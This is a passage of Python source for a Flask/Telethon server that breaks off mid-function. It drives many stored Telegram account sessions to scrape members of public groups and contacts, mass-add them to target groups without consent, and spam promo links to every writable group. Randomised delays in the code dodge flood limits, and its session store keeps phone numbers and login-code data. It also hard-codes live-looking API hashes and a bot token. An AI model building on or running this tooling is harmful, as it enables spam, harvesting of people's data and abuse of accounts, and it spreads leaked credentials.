#!/usr/bin/env python3
"""
Telegram Auto-Add Server - WITH AUTO SHARE SYSTEM & PREMIUM EMOJI SUPPORT
Optimized Dashboard - Chat list only, history on demand
Features: Auto Join, Auto Add Members, Auto Share Promo Message with Premium Emojis
"""

from flask import Flask, jsonify, request, redirect, send_file, render_template_string, Response
from flask_cors import CORS
from telethon import TelegramClient, errors, functions, types
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.messages import GetDialogsRequest, SendMessageRequest, GetHistoryRequest
from telethon.tl.types import (
    InputPeerEmpty, InputPeerUser, InputPeerChat, InputPeerChannel,
    MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage,
    MessageEntityCustomEmoji, DocumentAttributeCustomEmoji
)
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import logging.handlers
import time
import random
import threading
import requests
from datetime import datetime, timedelta
from collections import defaultdict
import traceback
import sys
import signal
import hashlib
import hmac
import urllib.parse
import base64
import mimetypes
from io import BytesIO
import re

# ============================================
# LOGGING CONFIGURATION
# ============================================
os.makedirs('logs', exist_ok=True)

file_handler = logging.handlers.RotatingFileHandler(
    'logs/server.log',
    maxBytes=10*1024*1024,
    backupCount=5
)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)
logger = logging.getLogger(__name__)

# ============================================
# FLASK APP INITIALIZATION
# ============================================
app = Flask(__name__, static_folder=None)
CORS(app)

# ============================================
# SERVER CONFIGURATION
# ============================================
SERVER_NUMBER = int(os.environ.get('SERVER_NUMBER', 4))

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 35894551, 'api_hash': '1886fc990cbf114bcd35055dfd300a30', 'url': 'https://accsell.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = os.environ.get('BOT_TOKEN', '7294379764:AAHAOQ1OVT2TJ0cRAlWhyyxXQdVB3oS9K_A')
REPORT_CHAT_ID = os.environ.get('REPORT_CHAT_ID', '-1002452548749')
TARGET_GROUPS = ['Habesha_tg_market', 'abe_army']

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# ============================================
# FILE PATHS
# ============================================
ACCOUNTS_FILE = 'accounts.json'
SETTINGS_FILE = 'auto_add_settings.json'
STATS_FILE = 'stats.json'
WORKER_ADDS_FILE = 'worker_adds.json'
TEMP_SESSIONS_FILE = 'temp_sessions.json'
AUTO_SESSIONS_FILE = 'auto_sessions.json'
USER_MAP_FILE = 'user_map.json'
SHARE_GROUPS_FILE = 'share_groups.json'
SHARE_CONFIG_FILE = 'share_config.json'
MEDIA_CACHE_DIR = 'media_cache'

os.makedirs(MEDIA_CACHE_DIR, exist_ok=True)

# ============================================
# STORAGE WITH THREAD LOCKS
# ============================================
accounts = []
temp_sessions = {}
auto_sessions = {}
user_phone_map = {}
auto_add_settings = {}
running_tasks = {}
running_share_tasks = {}
worker_adds = defaultdict(list)
share_groups = []
share_stats = {
    'total_shares': 0,
    'today_shares': 0,
    'last_share_time': None,
    'errors': 0
}
file_lock = threading.Lock()
worker_lock = threading.Lock()

# ============================================
# CHAT CACHE FOR DASHBOARD
# ============================================
chat_list_cache = {}
message_cache = {}
cache_lock = threading.Lock()
CHAT_LIST_CACHE_DURATION = 15
MESSAGE_CACHE_DURATION = 30

# ============================================
# STATISTICS
# ============================================
stats = {
    'total_added': 0,
    'today_added': 0,
    'verified_total': 0,
    'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'),
    'worker_stats': {},
    'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat(),
    'crashes_recovered': 0
}

# Global config variables
share_config = {}
PROMO_MESSAGE = "🔥 t.me/abe_army 🔥"
SHARE_INTERVAL_SECONDS = 300
SHARE_DELAY_BETWEEN_GROUPS = 20
AUTO_SHARE_ENABLED = True

# ============================================
# FILE OPERATIONS (MUST BE DEFINED BEFORE USE)
# ============================================
def load_json(path, default):
    """Load JSON file with backup recovery"""
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                content = f.read().strip()
                if content:
                    data = json.loads(content)
                    backup_path = f"{path}.backup"
                    with open(backup_path, 'w') as backup:
                        json.dump(data, backup, indent=2, default=str)
                    return data
    except json.JSONDecodeError as e:
        logger.error(f"Corrupted JSON file {path}: {e}")
        backup_path = f"{path}.backup"
        if os.path.exists(backup_path):
            try:
                with open(backup_path, 'r') as backup:
                    logger.info(f"Restored {path} from backup")
                    return json.load(backup)
            except:
                pass
    except Exception as e:
        logger.error(f"Load error {path}: {e}")
    return default

def save_json(path, data):
    """Save JSON file atomically"""
    temp_path = f"{path}.tmp"
    with file_lock:
        try:
            with open(temp_path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            os.replace(temp_path, path)
        except Exception as e:
            logger.error(f"Save error {path}: {e}")

def load_share_config():
    """Load share configuration from file"""
    default_config = {
        'messages': [
            "🔥🔥🔥🔥🔥🔥🔥🔥\n🔥 t.me/abe_army  🔥\n🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
        ],
        'current_message_index': 0,
        'share_interval_seconds': 300,
        'share_delay_between_groups': 20,
        'auto_share_enabled': True,
        'rotate_messages': True,
        'use_premium_emojis': True,
        'last_updated': datetime.now().isoformat()
    }
    
    config = load_json(SHARE_CONFIG_FILE, default_config)
    return config

def save_share_config(config):
    """Save share configuration to file"""
    config['last_updated'] = datetime.now().isoformat()
    save_json(SHARE_CONFIG_FILE, config)

def save_temp_sessions():
    """Save temporary sessions"""
    sessions_data = {}
    for session_id, session_data in temp_sessions.items():
        sessions_data[session_id] = {
            'phone': session_data['phone'],
            'hash': session_data['hash'],
            'session': session_data['session'],
            'password_attempts': session_data.get('password_attempts', 0),
            'code_attempts': session_data.get('code_attempts', 0),
            'created_at': session_data.get('created_at', time.time()),
            'telegram_id': session_data.get('telegram_id', ''),
            'first_name': session_data.get('first_name', ''),
            'last_name': session_data.get('last_name', ''),
            'username': session_data.get('username', '')
        }
    save_json(TEMP_SESSIONS_FILE, sessions_data)

def load_temp_sessions():
    """Load temporary sessions"""
    global temp_sessions
    sessions_data = load_json(TEMP_SESSIONS_FILE, {})
    temp_sessions = {}
    current_time = time.time()
    for session_id, session_data in sessions_data.items():
        created_at = session_data.get('created_at', 0)
        if current_time - created_at < 3600:
            temp_sessions[session_id] = session_data

def save_auto_sessions():
    """Save auto-login sessions"""
    save_json(AUTO_SESSIONS_FILE, auto_sessions)

def load_auto_sessions():
    """Load auto-login sessions"""
    global auto_sessions
    auto_sessions = load_json(AUTO_SESSIONS_FILE, {})

def save_user_map():
    """Save user phone mapping"""
    save_json(USER_MAP_FILE, user_phone_map)

def load_user_map():
    """Load user phone mapping"""
    global user_phone_map
    user_phone_map = load_json(USER_MAP_FILE, {})

def save_share_groups():
    """Save share groups list"""
    save_json(SHARE_GROUPS_FILE, share_groups)

def load_share_groups():
    """Load share groups list"""
    global share_groups
    share_groups = load_json(SHARE_GROUPS_FILE, [])
    for tg in TARGET_GROUPS:
        if tg not in share_groups:
            share_groups.append(tg)
    save_share_groups()

# ============================================
# EVENT LOOP HELPER
# ============================================
def get_or_create_eventloop():
    """Get or create an event loop for async operations"""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        return loop
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop

# ============================================
# TELEGRAM CLIENT HELPER
# ============================================
class SyncTelegramClient:
    """Helper class to run async Telethon operations synchronously"""
    
    @staticmethod
    def run_async(async_func, timeout=60, retries=2):
        """Run an async function synchronously with retries"""
        for attempt in range(retries + 1):
            try:
                loop = get_or_create_eventloop()
                result = loop.run_until_complete(
                    asyncio.wait_for(async_func(), timeout=timeout)
                )
                return result
            except asyncio.TimeoutError:
                logger.warning(f"Async timeout on attempt {attempt + 1}")
                if attempt == retries:
                    raise
            except Exception as e:
                logger.error(f"Async execution error (attempt {attempt + 1}): {e}")
                if attempt == retries:
                    raise
                time.sleep(2)
    
    @staticmethod
    def get_client(session_string):
        """Create a Telethon client from session string"""
        try:
            get_or_create_eventloop()
            return TelegramClient(
                StringSession(session_string), 
                API_ID, 
                API_HASH,
                connection_retries=5,
                retry_delay=2,
                timeout=30,
                auto_reconnect=True
            )
        except Exception as e:
            logger.error(f"Failed to create client: {e}")
            raise
    
    @staticmethod
    async def safe_connect(client):
        """Safely connect a client with timeout"""
        try:
            await asyncio.wait_for(client.connect(), timeout=15)
            return True
        except:
            return False

# ============================================
# PREMIUM EMOJI SUPPORT
# ============================================
def parse_premium_emojis(text):
    """Parse premium custom emojis from text"""
    premium_pattern = r':(\d{15,20}):'
    entities = []
    clean_text = text
    matches = list(re.finditer(premium_pattern, text))
    offset_adjustment = 0
    
    for match in matches:
        try:
            emoji_id = int(match.group(1))
            entity = MessageEntityCustomEmoji(
                offset=match.start() - offset_adjustment,
                length=1,
                document_id=emoji_id
            )
            entities.append(entity)
            placeholder_start = match.start() - offset_adjustment
            placeholder_end = match.end() - offset_adjustment
            clean_text = clean_text[:placeholder_start] + '⭐' + clean_text[placeholder_end:]
            offset_adjustment += len(match.group(0)) - 1
        except Exception as e:
            logger.error(f"Error parsing premium emoji: {e}")
            continue
    
    return clean_text, entities

async def send_message_with_premium_emojis(client, entity, text):
    """Send message with premium custom emoji support"""
    try:
        parsed_text, custom_emojis = parse_premium_emojis(text)
        if custom_emojis:
            result = await client.send_message(
                entity,
                parsed_text,
                formatting_entities=custom_emojis
            )
            logger.info(f"✅ Sent message with {len(custom_emojis)} premium emojis")
        else:
            result = await client.send_message(entity, text)
        return result
    except Exception as e:
        logger.error(f"Error sending message with emojis: {e}")
        try:
            return await client.send_message(entity, text)
        except:
            raise

# ============================================
# ACCOUNT AGE DETECTION
# ============================================
def get_account_age_sync(session_string):
    """Get account age synchronously"""
    async def _get_age():
        client = SyncTelegramClient.get_client(session_string)
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return {'age_display': 'Unknown'}
            if not await client.is_user_authorized():
                return {'age_display': 'Unknown'}
            me = await client.get_me()
            if hasattr(me, 'creation_date') and me.creation_date:
                creation_date = me.creation_date
                if hasattr(creation_date, 'tzinfo') and creation_date.tzinfo:
                    creation_date = creation_date.replace(tzinfo=None)
                age_days = (datetime.now() - creation_date).days
                age_years = age_days / 365.25
                return {
                    'age_days': age_days,
                    'age_years': round(age_years, 1),
                    'age_display': f"{int(age_years)} years, {age_days % 365} days",
                    'year_joined': creation_date.year
                }
            return {'age_display': 'Unknown'}
        except Exception as e:
            logger.error(f"Age detection error: {e}")
            return {'age_display': 'Unknown'}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    try:
        return SyncTelegramClient.run_async(_get_age, timeout=20)
    except:
        return {'age_display': 'Unknown'}

# ============================================
# ACCOUNT MANAGEMENT
# ============================================
def reset_daily():
    """Reset daily statistics"""
    try:
        today = datetime.now().strftime('%Y-%m-%d')
        if stats.get('last_reset') != today:
            stats['today_added'] = 0
            stats['verified_today'] = 0
            stats['last_reset'] = today
            for k in stats.get('worker_stats', {}):
                stats['worker_stats'][k]['today'] = 0
                stats['worker_stats'][k]['verified_today'] = 0
            share_stats['today_shares'] = 0
            save_json(STATS_FILE, stats)
    except Exception as e:
        logger.error(f"Reset daily error: {e}")

def check_account_auth(acc, max_retries=2):
    """Check if account is still authorized"""
    async def _check():
        client = SyncTelegramClient.get_client(acc['session'])
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return False
            return await client.is_user_authorized()
        except:
            return False
        finally:
            try:
                await client.disconnect()
            except:
                pass
    for attempt in range(max_retries):
        try:
            result = SyncTelegramClient.run_async(_check, timeout=15)
            if result is not None:
                return result
        except:
            if attempt == max_retries - 1:
                return False
            time.sleep(1)
    return False

def remove_dead_account(aid, reason=""):
    """Remove a dead/invalid account"""
    global accounts
    try:
        acc = next((a for a in accounts if a['id'] == aid), None)
        name = acc.get('name', str(aid)) if acc else str(aid)
        with worker_lock:
            accounts = [a for a in accounts if a['id'] != aid]
            auto_add_settings.pop(str(aid), None)
            if str(aid) in running_tasks:
                worker_info = running_tasks.pop(str(aid), None)
                if worker_info and worker_info.get('worker'):
                    try:
                        worker_info['worker'].stop()
                    except:
                        pass
            if str(aid) in running_share_tasks:
                running_share_tasks.pop(str(aid), None)
            worker_adds.pop(str(aid), None)
        save_json(ACCOUNTS_FILE, accounts)
        save_json(SETTINGS_FILE, auto_add_settings)
        save_json(WORKER_ADDS_FILE, dict(worker_adds))
        stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
        save_json(STATS_FILE, stats)
        logger.warning(f"Removed dead account: {name} | Reason: {reason}")
        try:
            send_telegram(f"<b>{SERVER_NAME}</b>\n❌ Removed: {name}\nReason: {reason}")
        except:
            pass
        return name
    except Exception as e:
        logger.error(f"Remove account error: {e}")
        return "Unknown"

def send_telegram(text, retries=3):
    """Send message to Telegram report chat"""
    for attempt in range(retries):
        try:
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                json={'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
                timeout=10
            )
            if response.status_code == 200:
                return True
        except Exception as e:
            logger.error(f"Send telegram error (attempt {attempt + 1}): {e}")
        if attempt < retries - 1:
            time.sleep(2)
    return False

# ============================================
# GROUP DISCOVERY
# ============================================
def discover_share_groups(account):
    """Discover groups where the account can share messages"""
    discovered_groups = set()
    
    async def _discover():
        nonlocal discovered_groups
        client = SyncTelegramClient.get_client(account['session'])
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return list(discovered_groups)
            if not await client.is_user_authorized():
                return list(discovered_groups)
            
            dialogs = await client.get_dialogs(limit=200)
            
            for dialog in dialogs:
                try:
                    if dialog.is_group or dialog.is_channel:
                        entity = dialog.entity
                        group_id = None
                        
                        if hasattr(entity, 'username') and entity.username:
                            group_id = entity.username
                        elif hasattr(entity, 'id'):
                            group_id = str(entity.id)
                        
                        if group_id:
                            try:
                                participant = await client.get_permissions(entity, 'me')
                                if participant and participant.send_messages:
                                    discovered_groups.add(group_id)
                                    logger.info(f"📢 Discovered share group: {entity.title or group_id}")
                            except:
                                discovered_groups.add(group_id)
                except:
                    continue
            
            for tg in TARGET_GROUPS:
                discovered_groups.add(tg)
            
            return list(discovered_groups)
        except Exception as e:
            logger.error(f"Discover groups error: {e}")
            return list(discovered_groups)
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    try:
        return SyncTelegramClient.run_async(_discover, timeout=45)
    except:
        return list(discovered_groups)

# ============================================
# AUTO SHARE WORKER
# ============================================
class AutoShareWorker:
    """Worker for automatic sharing of promo messages to groups"""
    
    def __init__(self, account):
        self.account = account
        self.acc_id = account['id']
        self.acc_key = str(self.acc_id)
        self.running = True
        self.client = None
        self.last_share_time = 0
        self.consecutive_errors = 0
        self.max_consecutive_errors = 10
        self.share_groups_list = []
        self.last_config_check = 0
        self._loop = None
    
    def stop(self):
        """Stop the worker"""
        self.running = False
        self.disconnect_client()
    
    def disconnect_client(self):
        """Disconnect the Telegram client"""
        if self.client:
            try:
                if self._loop and not self._loop.is_closed():
                    async def _disconnect():
                        try:
                            await self.client.disconnect()
                        except:
                            pass
                    try:
                        self._loop.run_until_complete(asyncio.wait_for(_disconnect(), timeout=5))
                    except:
                        pass
            except:
                pass
            finally:
                self.client = None
    
    def get_current_config(self):
        """Get current share configuration"""
        global share_config
        if time.time() - self.last_config_check > 60:
            share_config = load_share_config()
            self.last_config_check = time.time()
        return share_config
    
    def get_current_message(self):
        """Get the current message to share"""
        config = self.get_current_config()
        messages = config.get('messages', [])
        
        if not messages:
            return "@abe_army ✅ "
        
        if config.get('rotate_messages', True) and len(messages) > 1:
            index = config.get('current_message_index', 0)
            message = messages[index % len(messages)]
            config['current_message_index'] = (index + 1) % len(messages)
            save_share_config(config)
            return message
        else:
            return messages[0]
    
    def run(self):
        """Main worker loop"""
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)
        
        logger.info(f"📢 Auto-share worker started for {self.account.get('name', self.acc_id)}")
        
        self.refresh_share_groups()
        
        while self.running:
            try:
                config = self.get_current_config()
                
                if not config.get('auto_share_enabled', True):
                    time.sleep(10)
                    continue
                
                interval = config.get('share_interval_seconds', 300)
                
                current_time = time.time()
                time_since_last_share = current_time - self.last_share_time
                
                if time_since_last_share < interval:
                    wait_time = interval - time_since_last_share
                    for _ in range(min(int(wait_time), 300)):
                        if not self.running:
                            break
                        time.sleep(1)
                    continue
                
                if len(self.share_groups_list) == 0 or random.random() < 0.1:
                    self.refresh_share_groups()
                
                if not self.share_groups_list:
                    logger.warning(f"Share worker {self.acc_key}: No groups to share to, refreshing...")
                    self.refresh_share_groups()
                    time.sleep(30)
                    continue
                
                if self.ensure_connection():
                    self.share_to_all_groups()
                    self.last_share_time = time.time()
                else:
                    self.consecutive_errors += 1
                    if self.consecutive_errors >= self.max_consecutive_errors:
                        logger.error(f"Share worker {self.acc_key}: Too many connection failures")
                        break
                    time.sleep(30)
                
            except Exception as e:
                logger.error(f"Share worker {self.acc_key} cycle error: {e}")
                self.consecutive_errors += 1
                if self.consecutive_errors >= self.max_consecutive_errors:
                    break
                time.sleep(30)
        
        logger.info(f"Share worker {self.acc_key} stopped")
        try:
            if self._loop and not self._loop.is_closed():
                self._loop.close()
        except:
            pass
    
    def refresh_share_groups(self):
        """Refresh the list of groups to share to"""
        try:
            global share_groups
            if share_groups:
                self.share_groups_list = list(share_groups)
            else:
                discovered = discover_share_groups(self.account)
                self.share_groups_list = discovered
                for g in discovered:
                    if g not in share_groups:
                        share_groups.append(g)
                save_share_groups()
            
            logger.info(f"📢 Share worker {self.acc_key}: {len(self.share_groups_list)} groups to share to")
        except Exception as e:
            logger.error(f"Refresh share groups error: {e}")
    
    def ensure_connection(self):
        """Ensure client is connected"""
        try:
            if self.client and hasattr(self.client, 'is_connected'):
                try:
                    if self.client.is_connected():
                        async def ping():
                            try:
                                await self.client.get_me()
                                return True
                            except:
                                return False
                        if SyncTelegramClient.run_async(ping, timeout=10):
                            return True
                        else:
                            return self.reconnect()
                except:
                    pass
            return self.connect_client()
        except:
            return self.reconnect()
    
    def connect_client(self):
        """Connect the Telegram client"""
        for attempt in range(3):
            try:
                self.disconnect_client()
                time.sleep(1)
                self.client = SyncTelegramClient.get_client(self.account['session'])
                async def _connect():
                    if not await SyncTelegramClient.safe_connect(self.client):
                        return False
                    return await self.client.is_user_authorized()
                result = SyncTelegramClient.run_async(_connect, timeout=20)
                if result:
                    return True
            except Exception as e:
                logger.error(f"Share connect error (attempt {attempt + 1}): {e}")
            if attempt < 2:
                time.sleep(min(5 * (attempt + 1), 15))
        return False
    
    def reconnect(self):
        """Reconnect the client"""
        self.disconnect_client()
        time.sleep(3)
        return self.connect_client()
    
    def share_to_all_groups(self):
        """Share message to all groups"""
        config = self.get_current_config()
        delay_between = config.get('share_delay_between_groups', 20)
        message = self.get_current_message()
        
        groups = list(self.share_groups_list)
        random.shuffle(groups)
        
        success_count = 0
        fail_count = 0
        
        for group_id in groups:
            if not self.running:
                break
            
            try:
                if self.share_to_group(group_id, message):
                    success_count += 1
                    share_stats['total_shares'] = share_stats.get('total_shares', 0) + 1
                    share_stats['today_shares'] = share_stats.get('today_shares', 0) + 1
                    share_stats['last_share_time'] = datetime.now().isoformat()
                else:
                    fail_count += 1
                
                if group_id != groups[-1]:
                    logger.info(f"⏳ Waiting {delay_between}s before next share...")
                    for _ in range(delay_between):
                        if not self.running:
                            break
                        time.sleep(1)
                        
            except Exception as e:
                logger.error(f"Share to {group_id} error: {e}")
                fail_count += 1
        
        logger.info(f"📢 Share cycle complete: {success_count} success, {fail_count} failed")
        
        if success_count > 0:
            try:
                send_telegram(
                    f"<b>{SERVER_NAME}</b> - Share Report\n"
                    f"Account: {self.account.get('name', self.acc_id)}\n"
                    f"✅ Shared to: {success_count} groups\n"
                    f"❌ Failed: {fail_count}\n"
                    f"📊 Today total: {share_stats.get('today_shares', 0)}\n"
                    f"⏱️ Interval: {config.get('share_interval_seconds', 300)}s"
                )
            except:
                pass
    
    def share_to_group(self, group_id, message):
        """Share message to a specific group"""
        if not self.ensure_connection():
            return False
        
        async def _share():
            try:
                entity = None
                try:
                    if group_id.startswith('-'):
                        entity = await self.client.get_entity(int(group_id))
                    else:
                        entity = await self.client.get_entity(group_id)
                except:
                    try:
                        entity = await self.client.get_entity(int(group_id))
                    except:
                        return False
                
                await send_message_with_premium_emojis(self.client, entity, message)
                logger.info(f"✅ Shared to: {getattr(entity, 'title', group_id)}")
                return True
                
            except errors.FloodWaitError as e:
                logger.warning(f"Flood wait {e.seconds}s for {group_id}")
                time.sleep(min(e.seconds, 60))
                return False
            except errors.ChatWriteForbiddenError:
                logger.warning(f"Cannot write to {group_id} - removing from list")
                if group_id in self.share_groups_list:
                    self.share_groups_list.remove(group_id)
                global share_groups
                if group_id in share_groups:
                    share_groups.remove(group_id)
                    save_share_groups()
                return False
            except Exception as e:
                logger.error(f"Share to {group_id} error: {e}")
                return False
        
        try:
            return SyncTelegramClient.run_async(_share, timeout=20)
        except:
            return False

# ============================================
# AUTO-ADD WORKER
# ============================================
class AutoAddWorker:
    """Worker for automatically adding users to target groups"""
    
    def __init__(self, account):
        self.account = account
        self.acc_id = account['id']
        self.acc_key = str(self.acc_id)
        self.running = True
        self.client = None
        self.last_ping = time.time()
        self.consecutive_errors = 0
        self.max_consecutive_errors = 15
        self.last_activity = time.time()
        self.health_check_interval = 300
        self.last_health_check = time.time()
        self.joined_groups = set()
        self._loop = None
        self.total_added_this_session = 0
    
    def stop(self):
        """Stop the worker"""
        self.running = False
        self.disconnect_client()
    
    def disconnect_client(self):
        """Disconnect the Telegram client"""
        if self.client:
            try:
                if self._loop and not self._loop.is_closed():
                    async def _disconnect():
                        try:
                            await self.client.disconnect()
                        except:
                            pass
                    try:
                        self._loop.run_until_complete(asyncio.wait_for(_disconnect(), timeout=5))
                    except:
                        pass
            except:
                pass
            finally:
                self.client = None
    
    def run(self):
        """Main worker loop"""
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)
        
        logger.info(f"🚀 Auto-add worker started for {self.account.get('name', self.acc_id)}")
        
        self.join_all_targets()
        
        attempted_users = set()
        cycle_count = 0
        
        while self.running:
            try:
                if time.time() - self.last_health_check > self.health_check_interval:
                    self.perform_health_check()
                    self.last_health_check = time.time()
                
                self.consecutive_errors = 0
                
                settings = auto_add_settings.get(self.acc_key, {})
                if not settings.get('enabled', True):
                    self.last_activity = time.time()
                    time.sleep(5)
                    continue
                
                reset_daily()
                
                if not self.ensure_connection():
                    self.consecutive_errors += 1
                    if self.consecutive_errors >= self.max_consecutive_errors:
                        logger.error(f"Worker {self.acc_key}: Too many connection failures")
                        break
                    time.sleep(30)
                    continue
                
                user_ids = self.get_user_sources_enhanced()
                if not user_ids:
                    self.last_activity = time.time()
                    time.sleep(30)
                    continue
                
                if len(attempted_users) > 50000:
                    attempted_users.clear()
                
                fresh_users = [uid for uid in user_ids if uid not in attempted_users]
                if len(fresh_users) < 100:
                    attempted_users.clear()
                    fresh_users = list(user_ids)
                
                random.shuffle(fresh_users)
                delay = max(15, settings.get('delay_seconds', 20))
                added_count = 0
                
                batch_size = min(200, len(fresh_users))
                
                for user_id in fresh_users[:batch_size]:
                    if not self.running:
                        break
                    
                    settings_check = auto_add_settings.get(self.acc_key, {})
                    if not settings_check.get('enabled', True):
                        break
                    
                    attempted_users.add(user_id)
                    
                    try:
                        if self.add_user_to_targets(user_id):
                            added_count += 1
                            self.total_added_this_session += 1
                            stats['today_added'] = stats.get('today_added', 0) + 1
                            stats['total_added'] = stats.get('total_added', 0) + 1
                            
                            if self.acc_key not in stats['worker_stats']:
                                stats['worker_stats'][self.acc_key] = {'total': 0, 'today': 0, 'verified_today': 0}
                            stats['worker_stats'][self.acc_key]['today'] += 1
                            stats['worker_stats'][self.acc_key]['total'] += 1
                            
                            if added_count % 5 == 0:
                                save_json(STATS_FILE, stats)
                    except Exception as e:
                        logger.error(f"Add user {user_id} error: {e}")
                        self.consecutive_errors += 1
                        if self.consecutive_errors >= self.max_consecutive_errors:
                            break
                    
                    actual_delay = random.uniform(delay * 0.7, delay * 1.2)
                    self.last_activity = time.time()
                    time.sleep(actual_delay)
                    
                    if added_count > 0 and added_count % 50 == 0:
                        self.reconnect()
                
                cycle_count += 1
                logger.info(f"Worker {self.acc_key} Cycle {cycle_count}: Added {added_count} | Today: {stats['today_added']} | Session: {self.total_added_this_session}")
                save_json(STATS_FILE, stats)
                
                rest_time = random.randint(30, 90)
                for _ in range(rest_time):
                    if not self.running:
                        break
                    self.last_activity = time.time()
                    time.sleep(1)
                
            except Exception as e:
                logger.error(f"Worker {self.acc_key} cycle error: {e}")
                self.consecutive_errors += 1
                if self.consecutive_errors >= self.max_consecutive_errors:
                    logger.critical(f"Worker {self.acc_key}: Too many errors, stopping")
                    break
                time.sleep(30)
                self.reconnect()
        
        logger.info(f"Worker {self.acc_key} stopped - Total added: {self.total_added_this_session}")
        try:
            if self._loop and not self._loop.is_closed():
                self._loop.close()
        except:
            pass
    
    def perform_health_check(self):
        """Perform health check on the worker"""
        try:
            if time.time() - self.last_activity > 600:
                logger.warning(f"Worker {self.acc_key}: Inactive for 10 minutes, reconnecting...")
                self.reconnect()
                self.last_activity = time.time()
            
            if not self.ensure_connection():
                logger.warning(f"Worker {self.acc_key}: Unhealthy connection, reconnecting...")
                self.reconnect()
            
            if len(self.joined_groups) < len(TARGET_GROUPS):
                self.join_all_targets()
        except Exception as e:
            logger.error(f"Health check error: {e}")
    
    def ensure_connection(self):
        """Ensure client is connected"""
        try:
            if self.client and hasattr(self.client, 'is_connected'):
                try:
                    if self.client.is_connected():
                        if time.time() - self.last_ping > 120:
                            async def ping():
                                try:
                                    await self.client.get_me()
                                    return True
                                except:
                                    return False
                            if SyncTelegramClient.run_async(ping, timeout=10):
                                self.last_ping = time.time()
                                return True
                            else:
                                return self.reconnect()
                        return True
                except:
                    pass
            return self.connect_client()
        except:
            return self.reconnect()
    
    def connect_client(self):
        """Connect the Telegram client"""
        for attempt in range(3):
            try:
                self.disconnect_client()
                time.sleep(1)
                self.client = SyncTelegramClient.get_client(self.account['session'])
                async def _connect():
                    if not await SyncTelegramClient.safe_connect(self.client):
                        return False
                    return await self.client.is_user_authorized()
                result = SyncTelegramClient.run_async(_connect, timeout=20)
                if result:
                    self.last_ping = time.time()
                    self.last_activity = time.time()
                    return True
            except Exception as e:
                logger.error(f"Connect error (attempt {attempt + 1}): {e}")
            if attempt < 2:
                time.sleep(min(5 * (attempt + 1), 15))
        return False
    
    def reconnect(self):
        """Reconnect the client"""
        self.disconnect_client()
        time.sleep(3)
        return self.connect_client()
    
    def join_all_targets(self):
        """Join all target groups"""
        for target in TARGET_GROUPS:
            if target in self.joined_groups:
                continue
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    if not self.ensure_connection():
                        time.sleep(5)
                        continue
                    async def _join():
                        try:
                            entity = await self.client.get_entity(target)
                            await self.client(JoinChannelRequest(entity))
                            return True
                        except errors.FloodWaitError as e:
                            time.sleep(min(e.seconds, 120))
                            return False
                        except Exception as e:
                            if 'already' in str(e).lower() or 'participant' in str(e).lower():
                                return True
                            return False
                    if SyncTelegramClient.run_async(_join, timeout=30):
                        self.joined_groups.add(target)
                        logger.info(f"Worker {self.acc_key}: ✅ Joined {target}")
                        break
                except Exception as e:
                    logger.warning(f"Join {target} failed: {e}")
                time.sleep(min(5 * (attempt + 1), 20))
    
    def get_user_sources_enhanced(self):
        """Get user sources from various places"""
        user_ids = set()
        if not self.ensure_connection():
            return list(user_ids)
        
        async def _collect():
            nonlocal user_ids
            
            try:
                contacts = await self.client(GetContactsRequest(0))
                for user in contacts.users:
                    if user.id and not getattr(user, 'bot', False) and not user.deleted:
                        user_ids.add(user.id)
                logger.info(f"Collected {len(user_ids)} from contacts")
            except Exception as e:
                logger.debug(f"Contact collection error: {e}")
            
            try:
                dialogs = await self.client.get_dialogs(limit=200)
                for d in dialogs:
                    if d.is_user and d.entity and d.entity.id:
                        if not getattr(d.entity, 'bot', False) and not d.entity.deleted:
                            user_ids.add(d.entity.id)
                logger.info(f"Total after dialogs: {len(user_ids)}")
            except:
                pass
            
            source_groups = [
                'telegram', 'durov', 'TelegramTips', 'contest',
                'TelegramNews', 'builders', 'Android', 'iOS',
                'Python', 'programming', 'abe_army', 'Abe_armygroup',
                'Habesha_tg_market', 'ethiopia', 'addisababa',
                'cryptocurrency', 'bitcoin', 'ethereum'
            ]
            
            for sg in source_groups:
                try:
                    entity = await self.client.get_entity(sg)
                    participants = await self.client.get_participants(entity, limit=150)
                    for user in participants:
